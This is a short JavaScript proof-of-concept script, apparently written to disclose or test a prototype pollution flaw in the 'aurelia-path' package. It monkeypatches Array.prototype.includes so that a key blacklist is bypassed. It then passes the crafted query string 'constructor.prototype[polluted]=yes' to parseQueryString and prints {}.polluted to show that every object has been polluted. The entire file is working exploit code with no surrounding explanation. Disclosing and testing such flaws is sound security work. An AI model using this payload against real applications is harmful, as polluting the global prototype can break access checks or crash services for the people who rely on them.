Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const ap = require('aurelia-path');
console.log({}.polluted);
ap.parseQueryString('constructor.prototype[polluted]=yes');
console.log({}.polluted);